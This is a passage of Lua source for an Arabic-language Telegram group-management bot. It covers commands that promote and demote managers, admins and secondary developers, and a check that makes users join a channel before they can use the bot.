database:sadd(bot_id..'Manager'..msg.chat_id_, result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته مدير'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end 

if text and text:match("^رفع مدير (%d+)$") and Constructor(msg) then
local userid = text:match("^رفع مدير (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:sadd(bot_id..'Manager'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته مدير'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم ترقيته مدير'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end  
if text == ("تنزيل مدير") and msg.reply_to_message_id_ and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مدير @(.*)$") and Constructor(msg) then
local username = text:match("^تنزيل مدير @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من المدراء'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مدير (%d+)$") and Constructor(msg) then
local userid = text:match("^تنزيل مدير (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:srem(bot_id..'Manager'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------ adddev2 sudog
if text == ("رفع مطور ثاني") and tonumber(msg.reply_to_message_id_) ~= 0 then
if not SudoBot(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
return false
end
function Function_Black(extra, result, success)
database:sadd(bot_id.."Sudo:bot2", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","⋄تم ترقيته مطور ثاني في البوت")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Black, nil)
return false 
end
if text and text:match("^رفع مطور ثاني @(.*)$") and SudoBot(msg) then
local username = text:match("^رفع مطور ثاني @(.*)$")
function Function_Black(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:sadd(bot_id.."Sudo:bot2", result.id_)
Reply_Status(msg,result.id_,"reply","⋄تم ترقيته مطور ثاني في البوت")  
else
send(msg.chat_id_, msg.id_,"⋄لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Black, nil)
return false 
end
if text and text:match("^رفع مطور ثاني (%d+)$") and SudoBot(msg) then
local userid = text:match("^رفع مطور ثاني (%d+)$")
database:sadd(bot_id.."Sudo:bot2", userid)
Reply_Status(msg,userid,"reply","⋄تم ترقيته مطور ثاني في البوت")  
return false 
end
if text == ("تنزيل مطور ثاني") and tonumber(msg.reply_to_message_id_) ~= 0 then
if not SudoBot(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
return false
end
function Function_Black(extra, result, success)
database:srem(bot_id.."Sudo:bot2", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","⋄تم تنزيله من المطور ثانيين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Black, nil)
return false 
end
if text and text:match("^تنزيل مطور ثاني @(.*)$") and SudoBot(msg) then
local username = text:match("^تنزيل مطور ثاني @(.*)$")
function Function_Black(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:srem(bot_id.."Sudo:bot2", result.id_)
Reply_Status(msg,result.id_,"reply","⋄تم تنزيله من المطور ثانيين")  
else
send(msg.chat_id_, msg.id_,"⋄لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Black, nil)
return false
end  
if text and text:match("^تنزيل مطور ثاني (%d+)$") and SudoBot(msg) then
local userid = text:match("^تنزيل مطور ثاني (%d+)$")
database:srem(bot_id.."Sudo:bot2", userid)
Reply_Status(msg,userid,"reply","⋄تم تنزيله من المطور ثانيين")  
return false 
end
if text == ("المطورين الثانين") then
if not SudoBot(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id.."Sudo:bot2")
t = "\n⋄قائمة مطورين الثانين للبوت \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "⋄لا يوجد مطورين ثانيين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("مسح المطورين الثانين") and SudoBot(msg) then
database:del(bot_id.."Sudo:bot2")
send(msg.chat_id_, msg.id_, "\n⋄تم مسح قائمة المطورين الثانين  ")
end
if text == ("الادمنيه العامين") then
if not SudoBot(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id.."Gmod:User")
t = "\n⋄قائمة الادمنيه في البوت \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "⋄لا يوجد ادمنيه عامين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("مسح الادمنيه العامين") then
if not SudoBot(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
return false
end
database:del(bot_id.."Gmod:User")
send(msg.chat_id_, msg.id_, "\n⋄تم مسح قائمة الادمنيه العامين  ")
end
if text == ("المدراء العامين") then
if not SudoBot(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id.."Gmanager")
t = "\n⋄قائمة المدراء في البوت \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "⋄لا يوجد مدرا عامين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("مسح المدراء العامين") then
if not SudoBot(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
return false
end
database:del(bot_id.."Gmanager")
send(msg.chat_id_, msg.id_, "\n⋄تم مسح قائمة المدراء العامين  ")
end
------------------------------------------------------------------------
if text then -- رفع تلقائي للمالك
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local num2 = 0
local admins = data.members_
for i=0 , #admins do
if data.members_[i].bot_info_ == false and data.members_[i].status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id.."Mod:User"..msg.chat_id_, admins[i].owner_id)
num2 = num2 + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].owner_id},function(arg,b) 
if b.username_ == true then
end
if b.first_name_ == false then
database:srem(bot_id.."CoSu"..msg.chat_id_, admins[i].owner_id)
end
end,nil)   
else
database:srem(bot_id.."CoSu"..msg.chat_id_, admins[i].owner_id)
end
end
if num2 == 0 then
send(msg.chat_id_, msg.id_,"") 
else
send(msg.chat_id_, msg.id_,"") 
end
end,nil)   
end
if text then -- رفع تلقائي للادمن
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local num2 = 0
local admins = data.members_
for i=0 , #admins do
if data.members_[i].bot_info_ == false and data.members_[i].status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
num2 = num2 + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,b) 
if b.username_ == true then
end
if b.first_name_ == false then
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end
if num2 == 0 then
send(msg.chat_id_, msg.id_,"") 
else
send(msg.chat_id_, msg.id_,"") 
end
end,nil)   
end
if text == 'مسح الادمنيه' and Manager(msg) then
database:del(bot_id..'Mod:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⋄تم مسح الادمنيه')
end
if text == ("الادمنيه") then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'Mod:User'..msg.chat_id_)
t = "\n⋄قائمة الادمنيه \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد ادمنيه"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للادمنيه") or text == ("صيح الادمنيه") then
local list = database:smembers(bot_id..'Mod:User'..msg.chat_id_)
t = "\n⋄وينكم تعالو يريدوكم بالجروب \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد ادمنيه"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع ادمن") and msg.reply_to_message_id_ and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته ادمن'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع ادمن @(.*)$") and Manager(msg) then
local username = text:match("^رفع ادمن @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:sadd(bot_id..'Mod:User'..msg.chat_id_, result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته ادمن'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع ادمن (%d+)$") and Manager(msg) then
local userid = text:match("^رفع ادمن (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'Mod:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته ادمن'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم ترقيته ادمن'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل ادمن") and msg.reply_to_message_id_ and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من الادمنيه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل ادمن @(.*)$") and Manager(msg) then
local username = text:match("^تنزيل ادمن @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من الادمنيه'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل ادمن (%d+)$") and Manager(msg) then
local userid = text:match("^تنزيل ادمن (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:srem(bot_id..'Mod:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من الادمنيه'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم تنزيله من الادمنيه'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == 'مسح المدراء الثانين' and BasicConstructor(msg) then
database:del(bot_id..'S00F4:MN:TF'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⋄تم مسح المدير ثانيين')
end
if text == ("المدراء الثانين") and BasicConstructor(msg) then
local list = database:smembers(bot_id..'S00F4:MN:TF'..msg.chat_id_)
t = "\n⋄قائمة المدير ثانيين \n≪┉┉┉┉┉┉𝓓𝓡𝓖┉┉┉┉┉┉≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد المدير ثانيين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع مدير ثاني") and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not BasicConstructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته مدير ثاني'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع مدير ثاني @(.*)$") and BasicConstructor(msg) then
local username = text:match("^رفع مدير ثاني @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not BasicConstructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:sadd(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته مدير ثاني'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع مدير ثاني (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^رفع مدير ثاني (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not BasicConstructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'S00F4:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته مدير ثاني'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم ترقيته مدير ثاني'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل مدير ثاني") and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
